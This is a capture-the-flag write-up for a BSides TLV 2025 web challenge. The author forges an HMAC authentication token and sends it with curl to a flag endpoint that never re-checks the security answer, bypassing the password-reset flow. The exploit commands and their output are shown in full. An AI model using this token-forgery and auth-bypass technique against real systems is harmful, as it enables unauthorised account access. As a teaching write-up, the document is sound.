# Qu3sti0n Everything

 * Category: Web
 * Solved by the JCTF Team

## Description

> The Admin misplaced his password again. Your mission is to help him recover it and unlock the reset process. But be warned: not everything is what it seems. Sometimes the answer hides in the body of the question itself, waiting for the sharp-eyed challenger to spot it.
> 
> Think carefully, inspect everything, and trust nothing. Good luck… the Admin is counting on you.

## Solution

We arrive to a website called "`Auth Replay: Mirror of Trust`". 
It contains the following form:

```html
    <div class="card mb-4">
      <div class="card-body">
        <h5 class="card-title">Step 1: Username Lookup</h5>
        <input type="text" class="form-control mb-2" id="username" placeholder="Enter username">
        <button class="btn btn-primary" onclick="lookupUser()">Lookup</button>
        <div id="lookupStatus" class="mt-2 text-muted"></div>
      </div>
    </div>
```

If we enter a username such as "test" and try to look it up, we receive a response that the user
is not found.

The sources contain the following Javascript code:

```javascript
let currentUser = "";

async function lookupUser() {
    const username = document.getElementById("username").value.trim();
    const status = document.getElementById("lookupStatus");
    if (!username) return status.innerText = "Please enter a username.";

    const res = await fetch(`/api/lookup`, {
    method: "POST",
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username })
    });

    if (res.ok) {
    currentUser = username;
    status.innerText = "User found. Proceed to security question.";
    fetchQuestion(username);
    } else {
    status.innerText = "User not found.";
    document.getElementById("step2").classList.add("d-none");
    }
}

async function fetchQuestion(username) {
    const res = await fetch(`/api/security-question?username=${username}`);
    const data = await res.json();
    if (data.question) {
    document.getElementById("securityQuestion").innerText = data.question;
    document.getElementById("step2").classList.remove("d-none");
    }
}

async function submitAnswer() {
    const answer = document.getElementById("securityAnswer").value.trim();
    const status = document.getElementById("answerStatus");
    if (!answer) return status.innerText = "Please enter an answer.";

    const res = await fetch(`/api/submit-answer`, {
    method: "POST",
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: currentUser, answer })
    });

    const data = await res.json();
    if (res.ok && data.token) {
    localStorage.setItem("auth_token", data.token);
    document.getElementById("tokenDisplay").innerText = data.token;
    status.innerText = "Correct answer! Token received.";
    document.getElementById("step3").classList.remove("d-none");
    document.getElementById("step4").classList.remove("d-none");
    } else {
    status.innerText = "Incorrect answer.";
    }
}

async function getFlag() {
    const token = localStorage.getItem("auth_token");
    const answer = document.getElementById("securityAnswer").value.trim();
    const status = document.getElementById("flagStatus");

    const res = await fetch(`/api/get-flag`, {
    method: "POST",
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        username: currentUser,
        securityAnswer: answer,
        token: token
    })
    });

    const data = await res.json();
    if (res.ok) {
    status.innerHTML = `<strong>🎉 FLAG:</strong> ${data.flag}`;
    } else {
    status.innerText = data.error || "Failed to retrieve flag.";
    }
}

//generate_token(username, answer)
// return hmac.new(key, data, hashlib.sha256).hexdigest()
```

This client-side JavaScript implements a multi-step authentication flow. It first looks up whether a username exists via `/api/lookup`, then fetches and displays that user's security question. After the user submits an answer, it sends the answer to `/api/submit-answer` and stores the returned authentication token in local storage. 
In addition, it exposes an API to read the flag which uses the username, answer and token to request it.

The first step seems to be finding a username we can work with, and `admin` is usually a safe bet.

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/Qu3sti0n_Everything]
└─$ curl 'https://bstlv25-qu3sti0n-everything.chals.io/api/lookup' -X POST -H 'Content-Type: application/json' --data-raw '{"username":"admin"}'
{"status":"user found"}
```

Now that we found a user, we can proceed to try and answer the security question:

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/Qu3sti0n_Everything]
└─$ curl 'https://bstlv25-qu3sti0n-everything.chals.io/api/submit-answer' -X POST -H 'Content-Type: application/json' --data-raw '{"username":"admin","answer":"blue"}'
{"error":"incorrect answer"}
```

Seriously? Who's favorite color isn't blue?

Anyway, if the answer would have been accepted, we would have received a token that could
have been used to later query the flag. We didn't get this token, but we do see some hint
as to how it's created in the comments:

```javascript
//generate_token(username, answer)
// return hmac.new(key, data, hashlib.sha256).hexdigest()
```

What if we create our own token and send it ourselves? If the `/api/get-flag` verification
logic was incorrectly implemented, it might verify that the token itself is legal as a
standalone, possibly without checking that the data matches the expected data in the database.

We first create the HMAC for the data we'll send:

```python
>>> import hmac
>>> import hashlib
>>> hmac.new(b"admin", b"blue", hashlib.sha256).hexdigest()
'36087bd1c6f11fe81665900bfb24fbd5f6917830ccb2e33e1c24e50e34ab94a6'
```

Then send it directly to the `get-flag` API:

```console
┌──(user@kali3)-[/media/sf_CTFs/bsides/Qu3sti0n_Everything]
└─$ curl -X POST https://bstlv25-qu3sti0n-everything.chals.io/api/get-flag -H 'Content-Type: application/json' --data-binary '{"username": "admin", "securityAnswer": "blue", "token": "36087bd1c6f11fe81665900bfb24fbd5f6917830ccb2e33e1c24e50e34ab94a6"}'
{"flag":"BSidesTLV2025{L4_DoTdOt_SEcURE2025_Trust_bouNdary}"}
```

Luckily, this API didn't verify the security answer against the DB again, and we got the flag.